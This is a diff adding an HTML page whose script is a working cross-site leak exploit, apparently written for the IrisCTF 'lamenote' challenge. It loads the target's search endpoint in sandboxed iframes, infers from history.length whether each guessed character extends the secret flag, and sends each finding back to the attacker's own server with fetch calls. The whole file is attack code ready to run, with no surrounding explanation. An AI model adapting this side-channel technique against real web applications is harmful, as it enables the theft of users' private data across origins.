@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+    <script>
+    (async function(){
+    async function go(body) {
+      let url = "https://lamenote-web.chal.irisc.tf/search?query=irisctf{" + body
+
+      f = document.createElement('iframe')
+      f.setAttribute('sandbox', 'allow-same-origin');
+      f.setAttribute('csp', 'img-src \'none\';')
+      f.src = url;
+      let rCount = 0;
+      f.onload = () => {
+          rCount += 1;
+          // change location after onload once
+          setTimeout(() => {
+              f.onload = null
+              f.src = url;
+          }, 100)
+      }
+      document.body.appendChild(f)
+      await new Promise(r => setTimeout(r, 1000));
+      f.remove();
+      f.src = '/csp';
+      document.body.appendChild(f)
+      await new Promise(r => setTimeout(r, 100));
+      let ll = f.contentWindow.history.length;
+      document.body.innerHTML = "";
+      return ll;
+    }
+    let known = "";
+    const urlParams = new URLSearchParams(window.location.search);
+    if(urlParams.get("known") !== null) known = urlParams.get("known");
+    let l = await go("!"); // start
+    console.log("start", l);
+    for(let c of '_abcdefgihkjlmnopqrstuvwxyz}') {
+      let l2 = await go(known + c);
+      console.log(l2, l, known, c);
+      fetch("/?log=" + l2 + "|" + l + "|" + known + "|" + c);
+      if(l2 == l) {
+        known += c;
+        l = l2;
+        fetch("/?log=" + known);
+        break;
+      };
+      l = l2;
+    }
+      if(!known.endsWith("}")) {
+        window.open("/?known=" + known);
+        window.close();
+        while(1) {
+          await new Promise(r => setTimeout(r, 1000));
+          console.log("idle");
+        }
+      }
+    })();
+    </script>
+</body>
+</html>
+
+
+
